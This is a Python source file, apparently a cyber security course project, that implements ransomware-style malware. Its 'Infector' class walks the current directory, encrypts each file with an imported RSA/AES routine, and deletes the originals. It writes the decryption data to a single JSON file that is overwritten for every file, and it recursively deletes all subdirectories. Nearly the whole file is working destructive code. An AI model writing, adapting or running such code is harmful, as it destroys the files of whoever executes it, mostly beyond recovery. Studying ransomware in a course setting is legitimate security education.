import shutil
import os, var, json, base64
from RSAMain import RSAEncryption
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, hashes, hmac, serialization
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding

'''
 You got totally
 ~ HAXXX0RD ~
 by:
 Brian Powell @BriianPowell
 Mina Messiha @MinaMessiha109
 CECS 378 - Cyber Security
 Aliasgari
'''

class Infector:
    def encryptDir(self):
        currentDir = os.getcwd()
        
        # Fetch a list of all files within the root directory
        for root, dirs, files in os.walk(currentDir):
            for file in files:
                if file not in var.EXCLUSIONS:
                    # Encrypting each files in the list of files
                    # For file in filesList:
                    RSACipher, CT, IV, TAG, EXT = RSAEncryption().encryptRSA(root, os.path.join(root, file))
                    rsa2ascii = base64.encodebytes(RSACipher).decode('ascii')
                    ct2ascii = base64.encodebytes(CT).decode('ascii')
                    iv2ascii = base64.encodebytes(IV).decode('ascii')
                    tag2ascii = base64.encodebytes(TAG).decode('ascii')
                    
                    jData = json.dumps({'RSACipher': rsa2ascii, 'CT': ct2ascii, 'IV': iv2ascii, 'TAG': tag2ascii, 'EXT': EXT})

                    os.remove(os.path.join(root,file))
                    # Writing encryption data to JSON file
                    with open('ripLul.json', 'w') as jFile:    
                        jFile.write(jData)
                        jFile.close()
            for dir in dirs:
                shutil.rmtree(os.path.join(root, dir), ignore_errors=True)


def main():
    Infector().encryptDir()

if __name__ == '__main__':
    main()